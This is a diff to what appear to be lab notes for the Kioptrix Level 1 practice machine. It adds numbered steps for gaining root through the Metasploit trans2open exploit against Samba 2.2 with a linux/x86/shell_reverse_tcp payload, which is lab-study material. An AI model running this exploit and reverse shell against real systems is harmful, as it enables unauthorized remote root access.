@@ -322,14 +322,26 @@ output:
  
   Geting Root w/ metasploit
  --------------------------------------------------
- searchsploit  samba 2.2 
+  run   searchsploit    samba 2.2  
       in the output list you will  find many strings 'trans2open'
- run msfconsole  
- inside msfconsole 
-       search trans2open 
- 
- 
- 
+ 1.run msfconsole  
+ 2.inside msfconsole  write search trans2open
+ 3.use 1
+ 4.options
+ 5.set   rhosts  10.0.2.4 # the remote host we are attaking 
+ 6 show targets
+ 7. exploit
+ output: many messages of the fromat '10.0.2.4 - Meterpreter session 1 closed.  Reason: Died'
+ 8. Ctrl + C
+ 9. set payload linux/x86/   and double tab 
+    output: A list of Payloads 
+ 10. chose   set payload linux/x86/shell_reverse_tcp	
+ 11. run
+ 12 when stop write whoami and the answer is root
+    write hostname the answer is kioptrix.level1
+==========================================================
+ 02:40:00  
+
  Demo Report
  --------------------
  80/443 http://10.0.2.4
